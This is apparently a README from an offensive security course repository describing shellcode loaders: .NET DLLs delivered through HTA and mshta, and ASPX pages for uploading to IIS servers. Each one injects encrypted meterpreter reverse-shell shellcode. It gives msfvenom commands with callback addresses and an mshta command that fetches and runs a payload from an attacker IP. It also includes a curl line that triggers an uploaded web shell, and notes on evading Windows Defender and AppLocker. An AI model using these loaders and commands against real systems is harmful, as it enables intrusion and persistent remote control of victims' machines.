# Loaders - PEs

## ToC

| Application | Output | Notes |
| ----------- | ------ | ----- |
| `DLLRunner32` | DLL | 32-bit Managed DLL that injects AES-Encrypted `meterpreter` Shellcode into the loading process (`mshta.exe`). For use in HTA payloads. |
| `DLLInject64` | DLL | 64-bit Managed DLL that injects AES-Encrypted `meterpreter` Shellcode into a target process. For use in HTA payloads. |
| `ASPX_Inject64` | ASPX | ASPX Loader that injects 64-bit AES-Encrypted `meterpreter` shellcode into the loading process.  |
| `ASPX_Runner64` | ASPX | ASPX Loader that injects 64-bit AES-Encrypted `meterpreter` shellcode into a target process. |

## DLLRunner32

C# source code project that creates a managed (.NET) DLL which contains AES encrypted shellcode. This is designed to be used in an HTA payload that has been crafted with the help of the `DotNetToJScript.exe` binary as taught in the course.

When Initialized, the DLL decrypts the shellcode, allocates RWX memory for it in the process trying to load the DLL, and points execution to it. The DN2JS program and its required DLL is included in this project as well. To construct the desired JavaScript, you can run the following in DLLRunner32 folder:
```bat
DotNetToJScript.exe DLLRunner32_DN2JS.dll --lang=Jscript -c DLLRunner32_DN2JS --ver=v4 -o DLLRunner32_DN2JS.js
```

### Notes

- The JavaScript output is designed to be delivered through an Internet Explorer client visiting the HTA page
  - Because of this, the shellcode and DLL should be 32-bit
- You will have to change the shellcode payload that is hardcoded into the DLL if wanting to use it, see [below instructions](#creating-new-payloads)
  - It uses an msfvenom payload that I created by default, but you can use **any shellcode**! Just run it through the steps below
- Tested on Windows Defender setup:
  ```
  AMEngineVersion                 : 1.1.18400.5
  AMProductVersion                : 4.18.2009.7
  AMRunningMode                   : Normal
  AMServiceEnabled                : True
  AMServiceVersion                : 4.18.2009.7
  AntispywareEnabled              : True
  AntispywareSignatureAge         : 867
  AntispywareSignatureLastUpdated : 8/22/2021 5:28:57 PM
  AntispywareSignatureVersion     : 1.347.247.0
  AntivirusEnabled                : True
  AntivirusSignatureAge           : 867
  AntivirusSignatureLastUpdated   : 8/22/2021 5:28:56 PM
  AntivirusSignatureVersion       : 1.347.247.0
  ```
  - The Windows Defender setup shown above flags the DotNetToJS setup code in the Users's Internet Explorer cache directory, but interestingly enough even if the cached file is deleted, the `mshta.exe` process that the shell is living in isn't killed. So, you get to keep the shell!
 
### Creating New Payloads

1. Create the payload. Example:
    - ```sh
      cd Shellcode-Encryption; msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.45.241 LPORT=53 -f raw > shellcode.raw
      ```
2. Create the template with `shellcode_encoder.py`. Example:
    - ```sh
      python shellcode_encoder.py -cs ./shellcode.raw blahBlah76 aes
      ```
3. Copy the key and encrypted shellcode into `DLLRunner32_DN2JS.cs`.
    - Keep in mind that the output template won't match up to the DLL code but you're smart enough to figure it out
    - Just copy/paste into the `key` and `buf` variables
4. Build the project
   - The project is integrated into the all-encompassing solution at `OSEP-Tools-v2/payloads/OSEP-Tools-v2.sln` 
    - Select this project, `Build` (it should be preset to x86-Release)
    - Default config will output to this project's `payload_dir/`
5. Create the JavaScript (on Windows). Example:
    - ```bat
      DotNetToJScript.exe DLLRunner32_DN2JS.dll --lang=Jscript -c DLLRunner32_DN2JS --ver=v4 -o DLLRunner32_DN2JS.js
      ```
6. Put into your HTA file
    - If you're debugging, you can add an `alert()` call in the JS's `debug` function


## DLLInject64

A combination of `DLLRunner32` and `clRunner` (in `Loaders_Shellcode`) projects. It injects `msfvenom windows/x64/meterpreter/reverse_tctp` shellcode into the specified 64-bit process.

This is basically the 64-bit brother of `DLLRunner32` that can't be delivered through IE, but is still very useful for bypassing default AppLocker rules. The `mshta.exe` triggering program is in the System32 folder which is whitelisted by default.

### Notes

- This **IS NOT** designed to be delivered through IE like DLLRunner32, rather you're supposed to load it with `mshta.exe`
  - The shellcode and DLL is 64-bit, if triggered through 32-bit IE, it will fail
- You will have to change the IP,PORT, & TGT_PROC arguments see [below instructions](#usage)
- Tested on Windows Defender setup:
  ```
  AMEngineVersion                 : 1.1.18400.5
  AMProductVersion                : 4.18.2009.7
  AMRunningMode                   : Normal
  AMServiceEnabled                : True
  AMServiceVersion                : 4.18.2009.7
  AntispywareEnabled              : True
  AntispywareSignatureAge         : 867
  AntispywareSignatureLastUpdated : 8/22/2021 5:28:57 PM
  AntispywareSignatureVersion     : 1.347.247.0
  AntivirusEnabled                : True
  AntivirusSignatureAge           : 867
  AntivirusSignatureLastUpdated   : 8/22/2021 5:28:56 PM
  AntivirusSignatureVersion       : 1.347.247.0
  ```
  - The Windows Defender setup shown above flags the DotNetToJS setup code in the Users's Internet Explorer cache directory, but interestingly enough even if the cached file is deleted, the `mshta.exe` process that the shell is living in isn't killed. So, you get to keep the shell!

### Usage

1. Change the hardcoded callback IP, Port, and target injection process arguments
    - Easiest way is to just edit the following line towards the bottom of [DLLInject64_DN2JS.js](DLLInject64/payload_dir/DLLInject64_DN2JS.js)
    - ```js
      o.RunProcess("192.168.45.241", "53", "svchost");
      ```
2. Download and run with `mshta`:
   - ```bat
     mshta http://192.168.45.241/tmp/rev/DLLInject64_DN2JS.hta
     ```

## ASPX Loaders

These projects are meant to be used when you have arbitrary file upload on an IIS Server website. If you can upload `.aspx` files, you may use something like these files to get a reverse shell using meterpreter.

Both of these files draw inspiration from the `msfvenom -f aspx` payloads for the basic format. They're basically a `clinject` (ASPX_Inject64) or `clrunner` (ASPX_Runner64) payload wrapped in ASPX formatting.

I also highly recommend this read to understand how ASPX Files work: [codeproject - Behind the Scense of ASPX Files](https://www.codeproject.com/Articles/5897/Behind-the-scenes-of-ASPX-files).

Both require user configuration in the first lines of their respective `Page_Load` functions, as well as removal of any comments/HTML as desired. I left them there for educative purposes, since that is the point of these projects.

After configuring and uploading either of them, just visit the path where they are stored and the IIS server will compile and execute them for you! How nice :)
```sh
curl http://pwn.victim.com/ASPX_Inject64.aspx
```

Both were tested on the following Windows Defender setup:
```
AMEngineVersion                 : 1.1.17500.4
AMProductVersion                : 4.18.2009.7
AMRunningMode                   : Normal
AMServiceEnabled                : True
AMServiceVersion                : 4.18.2009.7
AntispywareEnabled              : True
AntispywareSignatureAge         : 1188
AntispywareSignatureLastUpdated : 10/12/2020 8:24:19 PM
AntispywareSignatureVersion     : 1.325.683.0
AntivirusEnabled                : True
AntivirusSignatureAge           : 1188
AntivirusSignatureLastUpdated   : 10/12/2020 8:24:21 PM
AntivirusSignatureVersion       : 1.325.683.0
BehaviorMonitorEnabled          : False
```

The Windows Defender setup shown above flags the temporary DLL that's created during the ASPX file's compilation as meterpreter. However, even if the DLL is deleted/quarantined, the process that the shell is living in isn't killed. So, you get to keep the shell!

### ASPX_Inject64

Inject into the `TARGET_PROC` and return a `windows/x64/meterpreter/reverse_tcp` session to the listener at `RHOST:RPORT`. 

Keep in mind the process/user that is compiling and executing your payload. It *should be* an `IIS APPOOL` user (read up more on this group [on MS Docs](https://learn.microsoft.com/en-us/troubleshoot/developer/webapps/iis/www-authentication-authorization/default-permissions-user-rights)). These virtual accounts have as little permissions as possible.

That means that when looking for a process to inject into, it has to be a medium integrity or lower process. In a lot of servers, there just isn't many low-integrity processes that you can inject into. Then you have to think about any Exploit Protection settings that are in place.

The project picks the first PID returned from a process search using the provided name. You can update it so that it iterates through them until it finds one it can successfully inject into before continuing. I didn't feel like doing that here, but I did do it for the `powerinject` payload so you could draw inspiration from there.

If the payload isn't working and you don't know why, I recommend you start with the `ASPX_Runner64` payload. You can always just use meterpreter to migrate into another process, or elevate privs then use this.

OR you could use the `w3wp` process as your target, since you definitely have privileges for that.

### ASPX_Runner64

Inject into the loading process (`w3wp`) and return a `windows/x64/meterpreter/reverse_tcp` session to the listener at `RHOST:RPORT`.

This project has different signatures and uses different APIs than the injection one, so its just good to have variety. 

There is one big difference from the `clrunner` project that this is based off of baked into this: this project uses the `Marshal.Copy` .NET API, which is heavily hooked by AVs. This increases its detection rate compared to the use of other random APIs like in `clrunner`. However, we can't use other APIs because we need to copy data from a managed array `e` to an unmanaged memory region `payAddr`. There are few APIs that can do that (tbh I didn't look too much into it), so I just used the `Copy` method.

The `RtlFillMemory` approach used in `clrunner` can't be used here because we can't cast `e` to a fixed memory region without the `fixed` keyword for the code block. We can't use that keyword, without specifying the `/unsafe` argument to the compiler. We can't add that argument to the compiler without controlling the web.config file. If we *can control the web.config file*, then we can use the approach shown in this [stackoverflow article](https://stackoverflow.com/questions/5867613/how-to-add-unsafe-keyword-in-web-based-asp-net-application-c-sharp).

I would say this project has a higher reliability than `ASPX_Inject64`, but its also much easier to detect. In the end they both rely on heavily signatured meterpreter shellcode so they both get flagged at runtime so whatever.
